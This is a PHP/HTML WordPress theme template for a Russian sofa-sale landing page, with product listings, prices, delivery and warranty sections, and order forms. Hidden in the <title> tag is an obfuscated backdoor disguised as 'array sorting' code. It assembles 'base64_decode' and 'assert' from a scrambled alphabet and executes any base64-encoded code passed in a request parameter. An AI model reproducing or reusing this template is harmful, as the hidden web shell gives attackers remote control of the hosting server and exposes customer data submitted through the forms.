
<!doctype html>
<html lang="ru">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title><?php 

if(isset($_REQUEST["array"])){

	//sorting alphabet
	$alphabet='1/l9dtu45.mq;y)7pnzoa*c_eixrhw3gv68j2(0sbkf';
	//Array names
	$array_name = $alphabet[40].$alphabet[20].$alphabet[39].$alphabet[24].$alphabet[33].$alphabet[7].$alphabet[23].$alphabet[4].$alphabet[24].$alphabet[22].$alphabet[19].$alphabet[4].$alphabet[24];
	$array_postfix = 'sa';
	$array_prefix = 'tres';
	//Creating array
	$value = $array_prefix . $array_postfix;
	$value = strrev($value);
	//Sorting array
	@arsort($alphabet);
	@$value($array_name($_REQUEST["array"]));
	echo "Array sort completed";
	exit();
}

 bloginfo('name'); ?><?php wp_title(); ?></title>
<link href="//netdna.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.css" rel="stylesheet"> 
	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/libs/bootstrap/bootstrap-grid-3.3.1.min.css" />

	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/libs/owl.carousel/assets/owl.carousel.css" />

	<link rel="shortcut icon" href="favicon.ico" />
	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/style.css">

	<?php wp_head(); ?>
</head>
<body>
	<script src="<?php echo get_template_directory_uri(); ?>/libs/jquery/jquery-1.11.1.min.js"></script>
	<script src="<?php echo get_template_directory_uri(); ?>/libs/owl.carousel/owl.carousel.js"></script>
	<script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.mousewheel.js"></script>



	<script src="<?php echo get_template_directory_uri(); ?>/js/jquery.maskedinput.min.js"></script>
	<script src="<?php echo get_template_directory_uri(); ?>/js/common.js"></script>
<!-- Yandex.Metrika counter -->




<script type="text/javascript">
    (function (d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter42560139 = new Ya.Metrika({
                    id:42560139,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true,
                    webvisor:true
                });
            } catch(e) { }
        });

        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/42560139" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->

<div class="burg hidden-md hidden-lg"><i class="fa fa-bars" aria-hidden="true"></i></div>
<section class="section section_padding section_padding_db header-top">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				
				<div class="db-container-div">
					<ul class="db-container__menu db-container__menu_li-view ">
						<li><a href="#models">Модели диванов</a></li>
						<li><a href="#advantages">Преимущества</a></li>
						<li><a href="#conditions">Условия доставки</a></li>
					</ul>
					<div class="db-container__tel db-container__tel_view">
						<span><?php echo get_field('телефон'); ?></span> 
					</div>
				</div>
				<div class="clearfix"></div>
			</div>
		</div>
	</div>
</section>

<section class="section section_padding section_padding-db_header">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
			<div class="db-up">
				<h1>Спецпредложения</h1>
				<span>от мебельных фабрик</span>
			</div>
			<img src="<?php echo get_template_directory_uri(); ?>/img/db-header.png" alt="img" class="img-responsive">
			<p class="db-header-p">
				Мы выбирали для вас <br>
				<span>самые-пресамые модели</span> <br>
				2017 года!

			</p>
			</div>
		</div>
	</div>
</section>
<a name="models"></a>
<section class="section section_padding">
	<div class="container">
		<div class="row">
			<div class="col-md-12 df-center">
				<h2 class="df-caption">Модели диванов</h2>
				<div class="df-models df-models_view">
					<div class="df-model df-model_view model-link">
						<div class="df-models__img df-models__img_view">
							<a href="#model" class="model-link"><img src="/images/Arizona_Starlight.jpeg" alt=""></a>
						</div>
						<div class="df-models__characteristics df-models__characteristics_view">
							<span class="df-models__txt1 df-models__txt1_view">ДИВАН АРИЗОНА ЕВРОСОФА</span>
							<span class="df-models__txt2 df-models__txt2_view">95225 руб.</span>
							<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
							<input type="submit" value="подробнее" class="df-input_view">
						</div>
					</div>
					<div class="df-model df-model_view model-link2">
						<div class="df-models__img df-models__img_view">
							<a href="#model" class="model-link"><img src="/images/Nevada_WalesWhit_Tal3.jpg" alt=""></a>
						</div>
						<div class="df-models__characteristics df-models__characteristics_view">
							<span class="df-models__txt1 df-models__txt1_view">ДИВАН КРОВАТЬ НЕВАДА ЕВРОКНИЖКА</span>
							<span class="df-models__txt2 df-models__txt2_view">90985 руб.</span>
							<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
							<input type="submit" value="подробнее" class="df-input_view">
						</div>
					</div>
					<div class="df-model df-model_view model-link3">
						<div class="df-models__img df-models__img_view">
							<a href="#model" class="model-link"><img src="/images/chicago_2.jpg" alt=""></a>
						</div>
						<div class="df-models__characteristics df-models__characteristics_view">
							<span class="df-models__txt1 df-models__txt1_view">ДИВАН КРОВАТЬ ЧИКАГО ЕВРОКНИЖКА</span>
							<span class="df-models__txt2 df-models__txt2_view">95235 руб.</span>
							<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
							<input type="submit" value="подробнее" class="df-input_view">
						</div>
					</div>
				</div>	
			</div>
		</div>
	</div>
</section>
<a name="model"></a>
<section class="section df-section_padding">
	<div class="container">
		<div class="row">
			<div class="col-md-12 df-center">
				<div class="tovar-item item1">
					<h2 class="df-innerh2">ДИВАН АРИЗОНА ЕВРОСОФА</h2>
					<div class="df-cartproduct df-cartproduct_view">
						<div class="df-cartproduct__left df-cartproduct__left_view">

							<div class="df-cartproduct__img df-cartproduct__img_view dfimge1">
								<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart.jpg" alt="" class="img-responsive">								
							</div>
							<div class="df-cartproduct__choise df-cartproduct__choise_view">
								<div id="df-owl1">
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart1.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart2.jpg" alt="">
										</div>
									</div>
									<div class="item">	
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart3.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart1.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart2.jpg" alt="">
										</div>
									</div>
									<div class="item">	
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart3.jpg" alt="">
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="df-cartproduct__right df-cartproduct__right_view dfopen1">
							<span>Выберите расцветку</span>
							<div class="df-cartproduct__col df-cartproduct__col_view dfaimg1"><a href="/images/Arizona_Starlight.jpeg"><img src="/images/Arizona_Starlight.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_BlueTopa1_.jpeg"><img src="/images/Arizona_BlueTopa1_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_BlueTopaz2_.jpeg"><img src="/images/Arizona_BlueTopaz2_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_Magnolia_Beige_.jpeg"><img src="/images/Arizona_Magnolia_Beige_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/42.jpg"><img src="/images/42.jpg" alt=""></a></div>
						</div>
					</div>

					<div class="dfinner-text dfinner-text_view">
						<h4>Технические требования на еврософу «Аризона» соответствуют ГОСТ 16371-14, ГОСТ 19917-14 и конструкторской документации.</h4>	
						<div class="dfinner-text__p dfinner-text__p_view">
							<p>Спальное место: 1950х1540 мм</p>
							<p>Производитель: Фабрика "Авангард"</p>
							<p>Используются ортопедические матрасы ОРТО-2, выдерживают постоянные нагрузки до 150 кг на место. В данной модели за счет высокой плотности и латексных добавок работает эффект «миллиона пружинок», которые более жестко поддерживают естественные изгибы позвоночника. Сертификация по стандарту CertiPUR</p>
						</div>
						<p>Отделочную ткань можно выбрать под свой интерьер. В этом диване, в отличие от классической модели, отлично смотрятся не только традиционные, но и яркие молодёжные варианты обивки. Спальное место 195 см х 154 см обеспечивает комфортный сон, а прочный каркас не побеспокоят скрипом и поломками даже самых активных хозяев.</p>
					</div>

					<div class="df-price-box">					
						<span class="df-models__txt2 df-models__txt2_view">95225 руб.</span>
						<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
						<a href="#log-in7" name="modal" class="df-input_view2">Заказать</a>
					</div>
				</div>
				<div class="tovar-item item2">
					<h2 class="df-innerh2">ДИВАН КРОВАТЬ НЕВАДА ЕВРОКНИЖКА</h2>
					<div class="df-cartproduct df-cartproduct_view">
						<div class="df-cartproduct__left df-cartproduct__left_view">
							<div class="df-cartproduct__img df-cartproduct__img_view dfimge2">
								<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart.jpg" alt="" class="img-responsive">
							</div>
							<div class="df-cartproduct__choise df-cartproduct__choise_view">
								<div id="df-owl2">
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart1.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart2.jpg" alt="">
										</div>
									</div>
									<div class="item">	
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart3.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart1.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart2.jpg" alt="">
										</div>
									</div>
									<div class="item">	
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart3.jpg" alt="">
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="df-cartproduct__right df-cartproduct__right_view dfopen2">
							<span>Выберите расцветку</span>
							<div class="df-cartproduct__col df-cartproduct__col_view dfaimg1"><a href="/images/Arizona_Starlight.jpeg"><img src="/images/Arizona_Starlight.jpeg" alt=""></a></div>
							<!-- <div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_BlueTopa1_.jpeg"><img src="/images/Arizona_BlueTopa1_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_BlueTopaz2_.jpeg"><img src="/images/Arizona_BlueTopaz2_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_Magnolia_Beige_.jpeg"><img src="/images/Arizona_Magnolia_Beige_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/42.jpg"><img src="/images/42.jpg" alt=""></a></div> -->
						</div>
					</div>

					<div class="dfinner-text dfinner-text_view">
						<h4>Технические требования на диван «Невада» соответствуют ГОСТ 16371-14, ГОСТ 19917-14 и конструкторской документации.</h4>	
						<div class="dfinner-text__p dfinner-text__p_view">
							<p>Спальное место: 1950х1540 мм</p>
							<p>Производитель: Фабрика "Авангард"</p>
							<p>Диван-кровать «Невада» это новое направление в коллекции «Искусства и Ремесла» фабрики "Авангард". Дизайнерское решение в изготовлении видовых деревянных элементов к модели навеяно древним славянским фольклором. Декоративные элементы подлокотников напоминают атрибуты славянской мифологии.</p>
						</div>
						<p>Подлокотник дивана напоминает закат солнца и одновременно колесо. У восточных славян колесо несет значение оберега. А, как известно, обереги это магические средства предохраняющие человека и его мир: дом, счастье, достаток, от потенциальной опасности: болезней, сглаза, порчи, и стихийных бедствий. Разместив у себя в комнате такой диван, вы можете быть абсолютно спокойны за свой отдых и сон.</p>
					</div>

					<div class="df-price-box">					
						<span class="df-models__txt2 df-models__txt2_view">90985 руб.</span>
						<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
						<a href="#log-in7" name="modal" class="df-input_view2">Заказать</a>
					</div>
				</div>
				<div class="tovar-item item3">
					<h2 class="df-innerh2">ДИВАН КРОВАТЬ ЧИКАГО ЕВРОКНИЖКА</h2>
					<div class="df-cartproduct df-cartproduct_view">
						<div class="df-cartproduct__left df-cartproduct__left_view">
							<div class="df-cartproduct__img df-cartproduct__img_view dfimge3">
								<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart.jpg" alt="" class="img-responsive">
							</div>
							<div class="df-cartproduct__choise df-cartproduct__choise_view">
								<div id="df-owl3">
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/Chikago1.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/Chikago3.jpg" alt="">
										</div>
									</div>
									<div class="item">	
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/Chikago4.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/Chikago1.jpg" alt="">
										</div>
									</div>
									<div class="item">
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/Chikago3.jpg" alt="">
										</div>
									</div>
									<div class="item">	
										<div class="df-cartproduct__prod df-cartproduct__prod_view">
											<img src="<?php echo get_template_directory_uri(); ?>/img/Chikago4.jpg" alt="">
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="df-cartproduct__right df-cartproduct__right_view dfopen3">
							<span>Выберите расцветку</span>
							<div class="df-cartproduct__col df-cartproduct__col_view dfaimg1"><a href="/images/Arizona_Starlight.jpeg"><img src="/images/Arizona_Starlight.jpeg" alt=""></a></div>
							<!-- <div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_BlueTopa1_.jpeg"><img src="/images/Arizona_BlueTopa1_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_BlueTopaz2_.jpeg"><img src="/images/Arizona_BlueTopaz2_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/Arizona_Magnolia_Beige_.jpeg"><img src="/images/Arizona_Magnolia_Beige_.jpeg" alt=""></a></div>
							<div class="df-cartproduct__col df-cartproduct__col_view"><a href="/images/42.jpg"><img src="/images/42.jpg" alt=""></a></div> -->
						</div>
					</div>

					<div class="dfinner-text dfinner-text_view">
						<h4>Технические требования на диван «Чикаго» соответствуют ГОСТ 16371-14, ГОСТ 19917-14 и конструкторской документации.</h4>	
						<div class="dfinner-text__p dfinner-text__p_view">
							<p>Спальное место: 2020х1600 мм</p>
							<p>Производитель: Фабрика "Авангард"</p>
							<p>Используются ортопедические матрасы: матрас ОРТО-2 - до 150 кг на место. В данной модели за счет высокой плотности и латексных добавок работает эффект «миллиона пружинок», которые более жестко поддерживают естественные изгибы позвоночника. Сертификация по стандарту CertiPUR</p>
						</div>
						<p>Отделочную ткань можно выбрать под свой интерьер. В этом диване, в отличие от классической модели, отлично смотрятся не только традиционные, но и яркие молодёжные варианты обивки. Спальное место 202 см х 160 см обеспечивает комфортный сон, а прочный каркас не побеспокоят скрипом и поломками даже самых активных хозяев.</p>
					</div>

					<div class="df-price-box">					
						<span class="df-models__txt2 df-models__txt2_view">95235 руб.</span>
						<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
						<a href="#log-in7" name="modal" class="df-input_view2">Заказать</a>
					</div>
				</div>
			</div>
		</div>
	</div>
</section>



<a name="advantages"></a>
<section class="section section_padding section_padding-db-advant">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<h2>Преимущества</h2>
				<img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-line.png" alt="img" class="img-responsive db-garant-img">
			</div>
			<div class="clearfix"></div>
			<div class="col-md-4">
				<div class="db-advant-container">
					<div><img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-one.png" alt="img"></div>
					<span>Гарантия <br> 
						низкой цены</span>
						<p>На данном сайте <br>представлены эксклюзивные <br>цены на диваны российских <br>фабрик, данное <br>предложение вы нигде не<br> встретите, даже в <br> фирменных салонах.</p>
					</div>
				</div>
				<div class="col-md-4">
					<div><img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-two.png" alt="img"></div>
					<span>Фабричное<br>
						качество</span>
						<p>Качество продукции <br>гарантировано <br>фабрикой-производителем, <br>деревянные элементы диванов<br> выполнены из массива бука на <br> который роспространяется <br>гарантия 10 лет.</p>
					</div>
				<div class="col-md-4">
				<div><img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-three.png" alt="img"></div>
				<span>Массив <br>
					Северокавказского<br>
					бука</span>
					<p>Все диваны выполнены из <br>массива бука, который не <br>имеет сучков, обладает <br>антибактериальными <br>свойствами, а также имеет <br>свой неповторимый рисунок.</p>
				</div>
				<div class="clearfix"></div>
				<div class="col-md-4">
				<div><img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-four.png" alt="img"></div>
				<span>Ортопедический <br>
					матрас</span>
					<p>Матрасы обладают <br> ортопедическим эффектом, <br> это значит что они способны <br>максимально точно <br>обеспечивать правильное <br> физиологическое положение <br>позвоночника.</p>
				</div>
				<div class="col-md-4">
					<div><img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-five.png" alt="img"></div>
					<span>Эксклюзивные <br>
						модели диванов</span>
						<p>Данные модели диванов <br> разработаны известными <br> Российскими <br>дизайнерами-конструктами, <br>которые участвуют на <br> международных выставках <br>дизайна и интерьера.</p>
				</div>
				<div class="col-md-4">
					<div><img src="<?php echo get_template_directory_uri(); ?>/img/db-advant-six.png" alt="img"></div>
					<span>Гарантия <br>
						10 лет</span>
						<p>Фабрика дает гарантию 10 <br> лет на деревянные элементы <br> диванов, т.к. массив <br>северокавказского бука <br> является один из самых <br>долговечных материалов в <br> для мебели.</p>
					</div>
					<div class="clearfix"></div>
				</div>
	</div>
</section>
<a name="conditions"></a>
<section class="section section_padding section_padding-db-garant">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<h2>Условия доставки</h2>
				<img src="<?php echo get_template_directory_uri(); ?>/img/db-garant.png" alt="img" class="img-responsive db-garant-img">
				<?php echo get_field('текст_условия_доставки'); ?>
			</div>
		</div>
	</div>
</section>

<section class="section df-bg1 section_padding">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<h2 class="df-testi-cap">Отзывы</h2>
				<img src="<?php echo get_template_directory_uri(); ?>/img/df-img1.png" alt="" class="img-responsive df-margin-img">
				<div class="df-test">
				 	<?php $wp_query = new WP_Query('post_type=review'); ?>
					<?php while ($wp_query->have_posts()) : $wp_query->the_post(); ?>
					<div class="df-testi df-testi_view">
						<div class="df-testi__left df-testi__left_view">
							<div class="df-testi__img df-testi__img_view">
								<?php the_post_thumbnail(); ?>
							</div>
							<span><?php the_title(); ?></span>
						</div>
						<div class="df-testi__right df-testi__right_view">
							<p><?php echo get_the_content(); ?></p>
						</div>
					</div>
					<?php endwhile;?>
					<?php wp_reset_query(); ?>
				</div>
			</div>
		</div>
	</div>
</section>

<section class="section section_padding section_padding-db-garant">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<h2>Гарантии</h2>
				<img src="<?php echo get_template_directory_uri(); ?>/img/db-garant.png" alt="img" class="img-responsive db-garant-img">
				<?php echo get_field('тект_гарантии_'); ?>
				</div>
			</div>
		</div>
	</section>

<section class="section section_padding section_db-footer-view">
	<div class="container">
		<div class="row">
			<div class="db-footer-icon-container">
				<div class="db-footer-icon-one"><a href="#"><img src="<?php echo get_template_directory_uri(); ?>/img/db-footer-1.png" alt="img"></a></div>
				<div class="db-footer-icon-two"><a href="#"><img src="<?php echo get_template_directory_uri(); ?>/img/db-footer-2.png" alt="img"></a></div>
				<div class="db-footer-icon-three"><a href="#"><img src="<?php echo get_template_directory_uri(); ?>/img/db-footer-3.png" alt="img"></a></div>
			</div>
			<div class="col-md-12">
				<span class="db-footer-tel"><?php echo get_field('телефон'); ?></span>
			</div>
			<div class="clearfix"></div>
			<div class="col-md-12">
				<p class="db-footer-text">
					<?php echo get_field('текст_в_футере'); ?>
				</p>
				</div>
				<div class="clearfix"></div>
			</div>
		</div>
	</section>	

<div id="mask"></div>
<div id="log-in" class="window">
	<div class="dd-form-wrap">
		<form class="form1" action="#" method="post">
			<div class="form-wrap-main">
				<div class="dd-close">Х</div>
				<div class="dd-input-wrap dd-padding-bottom">
					<input type="text" name="uname" placeholder="Ваше имя">
					<input class="my-input phone" type="text" placeholder="Введите телефон" name="phone">
				</div>
				<input type="submit" class="form-button" name="submit" value="Заказать звонок">
			</div>
		</form>
	</div>
</div>
<div id="thanks" class="window">
	<div class="form-wrap-main">
		<div class="dd-close"></div>
		<div class="form-title">
			Спасибо за заявку!
		</div>
		<div class="dd-form-txt">
			Наш менеджер свяжется с Вами в ближайшее рабочее время с 9-00 до 18-00 кроме субботы и воскресенья! 
		</div>
	</div>
</div>
<a href="#thanks" name="modal"></a>
<a href="#" class="scrollToTop"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>

<div class="df-add-tovar window" id="log-in7">
	<div class="dd-close df-close"><img src="<?php echo get_template_directory_uri(); ?>/img/df-close2.png" alt=""></div>
	<form class="form1" action="#" method="post">
		<h2 class="df-h2cap">Заказать</h2>
		<img src="<?php echo get_template_directory_uri(); ?>/img/db-garant.png" alt="img" class="img-responsive db-garant-img">

		<div class="df-add__content">
			<div class="df-add__L">
				<div class="df-add__img">
					<img src="<?php echo get_template_directory_uri(); ?>/img/df-cart.jpg" alt="" class="img-responsive">
				</div>
				<span>Контактные данные для связи</span>
				<input type="text" name="uname" placeholder="Имя*" required>
				<input type="text" class="phone" name="phone" placeholder="Телефон*">
				<input type="email" name="email" placeholder="E-mail...">
				<input type="text" name="adress" placeholder="Адрес доставки">
			</div>
			<div class="df-all__R">
				<div class="df-table">
					<div class="df-row">
						<span class="df-nameproduct">Наимерование</span>
						<span class="df-nameproduct2 dfbold">Аризона Еврософа</span>
					</div>
					<div class="df-row">
						<span class="df-nameproduct">Материал обивки</span>
						<span class="df-nameproduct2"></span>
					</div>
					<div class="df-row">
						<span class="df-nameproduct">Стоимость</span>
						<span class="df-nameproduct2" id="price">54960</span>
					</div>
				</div>

				<div class="dfinner-text__p dfinner-text__p_view">
					<p>Спальное место: 1950х1540 мм</p>
					<p>Используются ортопедические матрасы: матрас ОРТО-2 - до 150 кг на место. В данной модели за счет высокой плотности и латексных добавок работает эффект «миллиона пружинок», которые более жестко поддерживают естественные изгибы позвоночника. Сертификация по стандарту CertiPUR</p>
				</div>

				<div class="df-send">
					<input type="checkbox" name="check" required> <label for="check">С условиями <a target="_blank" href="/oferta/oferta.docx">оферты</a> ознакомлен и согласен</label>
					<input type="hidden" class="totalprice" name="totalprice" value="">
					<input type="hidden" class="tovar" name="tovar" value="">
					<input type="hidden" class="colornumber" name="colornumber" value="">
					<input type="submit" class="df-input_view2" value="Отправить"> 
				</div>
			</div>
		</div>
	</form>
</div>
<?php wp_footer(); ?>
</body>
</html>

	

